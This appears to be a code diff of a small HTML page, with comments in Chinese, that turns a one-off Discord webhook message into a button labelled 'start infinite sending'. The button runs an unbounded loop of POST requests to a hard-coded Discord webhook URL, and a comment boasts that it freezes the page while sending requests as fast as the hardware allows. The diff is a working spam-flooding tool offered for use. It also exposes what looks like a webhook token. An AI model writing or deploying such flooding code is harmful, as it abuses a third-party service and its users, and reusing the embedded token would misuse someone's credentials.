@@ -2,28 +2,27 @@
 <html>
 <body>
 
-<button onclick="openTabs()">開啟頁面</button>
+<button onclick="openTabs()">開始無限發送</button>
 
 <script>
 const target = "https://brndan918.github.io/test_web2/";
+const webhookUrl = "https://discord.com/api/webhooks/1517220131984506951/m6o9HU7mbO2hiB-Vzu3q8kzly3jeHR3DzUNL6PmtghWDCLRdfzPyrxSv9ndZlhZy12-w";
 
 function openTabs() {
-    // 開兩個分頁
-    window.open(target, "_blank");
-    window.open(target, "_blank");
+    // 開新分頁
+    window.open(target, "_blank", "noopener,noreferrer");
 
-    // 發送 webhook（保留你的邏輯）
-    const data = { content: "spam starting noww" };
-
-    navigator.sendBeacon(
-        "https://discord.com/api/webhooks/1517220131984506951/m6o9HU7mbO2hiB-Vzu3q8kzly3jeHR3DzUNL6PmtghWDCLRdfzPyrxSv9ndZlhZy12-w",
-        new Blob([JSON.stringify(data)], { type: "application/json" })
-    );
-
-    // 稍微延遲再關閉（增加成功率）
-    setTimeout(() => {
-        window.close();
-    }, 300);
+    // 暴力無窮迴圈：不等待、不禮讓、完全佔滿主執行緒
+    // 點擊後網頁會立刻凍結（卡死），但會以硬體極限速度瘋狂噴出請求
+    while (true) {
+        fetch(webhookUrl, {
+            method: "POST",
+            body: JSON.stringify({ 
+                content: `Spamming...` 
+            }),
+            headers: { "Content-Type": "application/json" }
+        }).catch(() => {});
+    }
 }
 </script>
 
